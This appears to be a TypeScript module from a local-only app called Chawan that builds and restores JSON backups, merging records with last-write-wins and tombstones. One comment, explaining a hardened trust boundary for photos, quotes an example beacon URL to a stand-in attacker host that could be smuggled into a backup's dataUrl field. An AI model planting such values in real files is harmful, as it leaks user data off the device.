// Backup export / restore for the local-only build.
//
// IndexedDB is the sole copy of the user's data, so the JSON backup is the
// only migration + disaster path. What this handles that a blind put would not:
//   1. Photos (tinPhotos blobs) travel too, encoded as data URLs, each with its
//      own updatedAt so they merge by last-write-wins like every other row.
//   2. Restore is a MERGE by updatedAt, not an overwrite: an OLDER backup can't
//      roll back newer local edits.
//   3. Deletions propagate. Tombstones (deletedAt rows) are exported, and the
//      existing-row lookup on restore is tombstone-aware, so importing an old
//      backup can't resurrect something deleted since.
//   4. A quota failure is distinguished from a parse failure and surfaced, and
//      photo write failures are counted rather than swallowed into "success".
//
// Format history:
//   v1 — {tinId, dataUrl} photos, no timestamps; tins/sessions live-only.
//   v2 — photos carry updatedAt; tins/sessions include tombstones; `format: 2`.
//   v1 files still restore: a photo with no updatedAt is treated as older than
//   any stamped local copy (so it can't clobber), and the absence of tombstones
//   simply means an old backup carries no deletions to apply.
//
// The actual file write/share is delegated to shareOrDownload (share-card),
// which already handles the iOS WKWebView correctly (Filesystem + Share) —
// a raw <a download> silently no-ops there.

import { repository } from './repository';
import { SessionSchema, TinSchema, nowIso, type Session, type Tin } from './types';
import { isQuota } from './quota';
import { incomingWins, isImplausiblyFuture } from './backup-merge';

export interface BackupPhoto {
	tinId: string;
	/** Absent on a tombstone (format 3+). */
	dataUrl?: string; // "data:image/...;base64,...."
	updatedAt?: string; // ISO; absent in v1 backups
	/** Set when the photo was REMOVED. Without this a restore of an older file
	 *  silently reinstated a photo the user had deleted. */
	deletedAt?: string; // ISO
}

export interface BackupPayload {
	app: 'chawan';
	/** Backup schema version (not the app version — that's `version`). */
	format: number;
	version: string;
	exportedAt: string;
	tinsCount: number; // live items only — what the user thinks of as their data
	sessionsCount: number;
	photosCount: number;
	/** Rows the schema will reject on restore — 0 in a healthy export. */
	unrestorableCount?: number;
	tins: Tin[]; // includes tombstones (deletedAt set)
	sessions: Session[]; // includes tombstones
	photos: BackupPhoto[];
}

export interface RestoreResult {
	tinsAdded: number;
	tinsKept: number; // matching id, incoming not newer → kept existing
	tinsInvalid: number;
	sessionsAdded: number;
	sessionsKept: number;
	sessionsInvalid: number;
	photos: number; // written (added or updated)
	photosKept: number; // existing copy was newer → kept
	/** Photos that couldn't be written. Counted rather than swallowed: a photo
	 *  is the one part of a tin that exists nowhere else once restored. */
	photosFailed: number;
	/** Photos removed because the backup carried a removal newer than the local copy. */
	photosDeleted: number;
	/** Photos with no live tin to attach to (a deleted or absent tin). Skipped
	 *  so a stale/hand-edited file can't leave unreachable blobs eating quota. */
	photosSkipped: number;
}

export class QuotaError extends Error {
	/** What had already landed when storage ran out.
	 *
	 *  Restore is deliberately NOT wrapped in a transaction. It writes tins,
	 *  then sessions, then photos, and a rollback on the last one would throw
	 *  away a recovery that was 90% done — the opposite of what someone
	 *  restoring a backup wants. Because the merge ties to the incoming row
	 *  (see incomingWins), re-running the same file after freeing space is
	 *  idempotent and simply finishes the job. What was missing was telling
	 *  anyone that: the abort used to discard these counts, so the user was
	 *  left with "Storage is full" and no idea which half had landed. */
	readonly partial?: RestoreResult;
	constructor(partial?: RestoreResult) {
		super('Storage is full — free up space and try again.');
		this.name = 'QuotaError';
		this.partial = partial;
	}
}

function blobToDataUrl(blob: Blob): Promise<string> {
	return new Promise((resolve, reject) => {
		const r = new FileReader();
		r.onload = () => resolve(r.result as string);
		r.onerror = () => reject(r.error);
		r.readAsDataURL(blob);
	});
}

// Restore decodes photos by hand instead of handing the string to fetch().
// fetch() resolves ANY scheme, so a backup carrying
//   "dataUrl": "https://attacker.example/beacon?d=..."
// turned a restore into a real outbound request — in an app whose privacy
// policy states that nothing ever leaves the device, and which ships no CSP
// to catch it. A backup file is untrusted input: it can be edited by hand or
// arrive from anywhere, so the scheme is now proven, not assumed.
const PHOTO_DATA_URL = /^data:image\/(png|jpeg|webp);base64,([A-Za-z0-9+/]+={0,2})$/;

// Photos are downscaled to a 1280px long edge before storage (tins/photo.ts),
// which lands well under 1 MB; 8 MB is generous headroom that still refuses a
// file crafted to exhaust memory during decode.
const MAX_PHOTO_BYTES = 8 * 1024 * 1024;

// Exported for its own tests: this is the trust boundary for photo bytes
// arriving in a backup file, so it is worth pinning directly rather than only
// through restoreBackup().
export function dataUrlToBlob(dataUrl: string): Blob {
	const m = PHOTO_DATA_URL.exec(dataUrl.trim());
	if (!m) throw new Error('Photo is not a base64 image data URL.');
	const [, subtype, b64] = m;
	// Size-gate from the base64 length (4 chars per 3 bytes) BEFORE allocating.
	if ((b64.length * 3) / 4 > MAX_PHOTO_BYTES) throw new Error('Photo exceeds the size cap.');
	const bin = atob(b64); // throws on malformed base64
	const bytes = new Uint8Array(bin.length);
	for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
	return new Blob([bytes], { type: `image/${subtype}` });
}

/** Current backup schema version. 1: photos as {tinId,dataUrl}. 2: photo
 *  timestamps + tin/session tombstones. 3: photo tombstones. */
export const BACKUP_FORMAT = 3;

const isLive = (row: { deletedAt?: string }) => !row.deletedAt;

/** Gather everything (tins, sessions, and every tin photo) into one payload. */
export async function buildBackup(version: string): Promise<BackupPayload> {
	// Tombstones included so a restore elsewhere converges on the deletions too.
	const [tins, sessions] = await Promise.all([
		repository.listTinsWithDeleted(),
		repository.listSessionsWithDeleted()
	]);

	// Validate on the way OUT as well as on the way in. restoreBackup safeParses
	// every row and drops the failures into tinsInvalid/sessionsInvalid, so a row
	// that cannot satisfy the schema is one the backup carries but can never give
	// back — and the export is the last moment the original still exists to fix.
	// Export is not the place to silently drop data either, so this reports
	// rather than filters: the caller decides.
	const unrestorable = [
		...tins.filter((r) => !TinSchema.safeParse(r).success).map((r) => `tin ${r.id}`),
		...sessions.filter((r) => !SessionSchema.safeParse(r).success).map((r) => `session ${r.id}`)
	];
	if (unrestorable.length) {
		console.warn(
			`[backup] ${unrestorable.length} row(s) will not survive a restore:`,
			unrestorable.slice(0, 10)
		);
	}

	// Photos only for LIVE tins: a deleted tin shouldn't drag its picture back,
	// and a photo whose tin is gone would restore as an unreachable orphan.
	const liveTins = tins.filter(isLive);
	const photos: BackupPhoto[] = [];
	for (const tin of liveTins) {
		const rec = await repository.getTinPhotoRecord(tin.id);
		if (!rec) continue;
		if (rec.deletedAt || !rec.blob) {
			// Carry the removal, not the bytes. A restore elsewhere has to learn
			// that this photo is gone, or it would hand back a copy from its own
			// older data.
			photos.push({ tinId: tin.id, updatedAt: rec.updatedAt, deletedAt: rec.deletedAt });
			continue;
		}
		photos.push({
			tinId: tin.id,
			dataUrl: await blobToDataUrl(rec.blob),
			updatedAt: rec.updatedAt
		});
	}

	return {
		app: 'chawan',
		format: BACKUP_FORMAT,
		version,
		exportedAt: nowIso(),
		tinsCount: liveTins.length,
		sessionsCount: sessions.filter(isLive).length,
		photosCount: photos.length,
		unrestorableCount: unrestorable.length,
		tins,
		sessions,
		photos
	};
}

/**
 * Merge a parsed backup object into local storage. Throws QuotaError if the
 * device runs out of space mid-write (so the caller can show the right message
 * and the user knows the restore was partial). Any other per-row failure is
 * counted, never silently swallowed.
 *
 * Not wrapped in a transaction on purpose: every write is an idempotent LWW
 * decision, so a partial restore (e.g. quota) is consistent and completes on a
 * re-run once space is freed — cheaper than routing a Dexie transaction through
 * the repository boundary, and the photo-decode step (fetch) can't live inside
 * one anyway.
 */
export async function restoreBackup(data: unknown): Promise<RestoreResult> {
	if (!data || typeof data !== 'object' || (data as { app?: string }).app !== 'chawan') {
		throw new Error('Not a Chawan backup file.');
	}
	const d = data as {
		format?: unknown;
		exportedAt?: string;
		tins?: unknown[];
		sessions?: unknown[];
		photos?: unknown[];
	};

	// Refuse a file from a NEWER build rather than silently degrading it. Zod
	// strips unknown keys, so a future format would restore looking successful
	// while quietly dropping whatever that version added — the worst failure
	// mode for the one instrument that exists to not lose data. Older formats
	// (1 and 2) stay readable; only the future is refused.
	const format = typeof d.format === 'number' ? d.format : 1;
	if (format > BACKUP_FORMAT) {
		throw new Error(
			`This backup was made by a newer version of Chawan (format ${format}). Update the app, then restore.`
		);
	}
	const tinList = Array.isArray(d.tins) ? d.tins : [];
	const sessionList = Array.isArray(d.sessions) ? d.sessions : [];
	const photoList = Array.isArray(d.photos) ? d.photos : [];
	// v1 photos carry no timestamp; the export time is a safe LOWER bound on the
	// photo's age, so the merge can still order it (and it loses to anything
	// stamped later locally).
	//
	// When even exportedAt is missing there is no lower bound to be had, so this
	// is undefined rather than nowIso(). now() is an UPPER bound: it made an
	// unstamped photo in an unstamped file beat every locally-stamped one,
	// exactly inverting the rule stated above and in incomingWins() — the v1
	// clobber this fallback exists to prevent.
	const photoFallbackTs = typeof d.exportedAt === 'string' ? d.exportedAt : undefined;

	const res: RestoreResult = {
		tinsAdded: 0,
		tinsKept: 0,
		tinsInvalid: 0,
		sessionsAdded: 0,
		sessionsKept: 0,
		sessionsInvalid: 0,
		photos: 0,
		photosKept: 0,
		photosFailed: 0,
		photosDeleted: 0,
		photosSkipped: 0
	};

	// Tins that are LIVE after this restore. A photo is only written for one of
	// these, so a deleted or missing tin can't accrue an orphan blob.
	const liveTinIds = new Set<string>();

	for (const raw of tinList) {
		if (isImplausiblyFuture((raw as { updatedAt?: string })?.updatedAt)) {
			res.tinsInvalid++;
			continue;
		}
		const parsed = TinSchema.safeParse(raw);
		if (!parsed.success) {
			res.tinsInvalid++;
			continue;
		}
		const incoming = parsed.data;
		try {
			// getTinRaw, NOT getTin: getTin hides tombstones, so a deleted tin read
			// as "absent" and the incoming live row overwrote the tombstone —
			// silently resurrecting the delete. Raw lets the tombstone win the merge.
			const existing = await repository.getTinRaw(incoming.id);
			let live: boolean;
			if (existing && !incomingWins(incoming, existing)) {
				res.tinsKept++;
				live = isLive(existing);
			} else {
				await repository.saveTin(incoming);
				// A tombstone write propagates a deletion; it isn't an "add".
				if (isLive(incoming)) res.tinsAdded++;
				live = isLive(incoming);
			}
			if (live) liveTinIds.add(incoming.id);
		} catch (err) {
			if (isQuota(err)) throw new QuotaError(res);
			res.tinsInvalid++;
		}
	}

	for (const raw of sessionList) {
		if (isImplausiblyFuture((raw as { updatedAt?: string })?.updatedAt)) {
			res.sessionsInvalid++;
			continue;
		}
		const parsed = SessionSchema.safeParse(raw);
		if (!parsed.success) {
			res.sessionsInvalid++;
			continue;
		}
		const incoming = parsed.data;
		try {
			const existing = await repository.getSessionRaw(incoming.id);
			if (existing && !incomingWins(incoming, existing)) {
				res.sessionsKept++;
				continue;
			}
			await repository.saveSession(incoming);
			if (isLive(incoming)) res.sessionsAdded++;
		} catch (err) {
			if (isQuota(err)) throw new QuotaError(res);
			res.sessionsInvalid++;
		}
	}

	for (const raw of photoList) {
		const p = raw as Partial<BackupPhoto>;
		if (!p || typeof p.tinId !== 'string') continue;
		if (isImplausiblyFuture(p.updatedAt)) {
			res.photosFailed++;
			continue;
		}
		const isTombstone = typeof p.deletedAt === 'string';
		// A row must carry bytes or be a tombstone; anything else is malformed.
		if (!isTombstone && typeof p.dataUrl !== 'string') continue;
		// Orphan guard: attach only to a tin that's live after the restore.
		if (!liveTinIds.has(p.tinId)) {
			res.photosSkipped++;
			continue;
		}
		// Two different timestamps on purpose. `incomingTs` may be undefined —
		// that is what makes an unstamped photo lose to a stamped local one in
		// incomingWins(). `storedTs` is what we persist if it does win, and must
		// be a real ISO string, so it falls back to now(): the photo genuinely
		// arrived on this device now, and stamping it lets a later export order
		// it correctly.
		const incomingTs = typeof p.updatedAt === 'string' ? p.updatedAt : photoFallbackTs;
		const storedTs = incomingTs ?? nowIso();
		try {
			const existing = await repository.getTinPhotoRecord(p.tinId);
			if (existing && !incomingWins({ updatedAt: incomingTs }, existing)) {
				res.photosKept++;
				continue;
			}
			if (isTombstone) {
				await repository.deleteTinPhotoAt(p.tinId, storedTs);
				res.photosDeleted++;
			} else {
				await repository.setTinPhotoAt(p.tinId, dataUrlToBlob(p.dataUrl as string), storedTs);
				res.photos++;
			}
		} catch (err) {
			if (isQuota(err)) throw new QuotaError(res);
			// A single unreadable photo shouldn't abort the whole restore — but it
			// must still be reported, not folded into a success message.
			res.photosFailed++;
		}
	}

	return res;
}
